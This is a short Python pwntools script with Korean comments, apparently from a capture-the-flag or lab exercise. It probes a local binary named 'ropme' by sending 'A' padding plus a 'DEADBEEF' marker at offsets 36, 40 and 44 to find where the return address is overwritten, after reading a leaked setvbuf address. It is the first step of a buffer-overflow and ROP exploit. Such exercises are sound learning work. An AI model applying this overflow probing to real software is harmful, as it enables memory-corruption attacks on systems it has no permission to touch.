from pwn import *

# 버퍼 (overflowme): 32바이트
# 저장된 RBP: 8바이트
# 리턴 주소: 8바이트

# 바이너리 파일 로드
elf = ELF('./ropme')

def test_offset(size):
    print(f"\nTesting offset: {size}")
    p = process('./ropme')
    
    # 페이로드 생성
    payload = b'A' * size             # 버퍼 + RBP
    payload += b'DEADBEEF'            # 리턴 주소를 확실히 구분할 수 있는 값
    
    # setvbuf 주소 받기
    p.recvline()
    
    # 페이로드 전송
    p.sendline(payload)
    
    try:
        p.recvall()
    except EOFError:
        print("Program crashed!")
    
    p.close()

# 36, 40, 44 바이트로 테스트
for offset in [36, 40, 44]:
    test_offset(offset)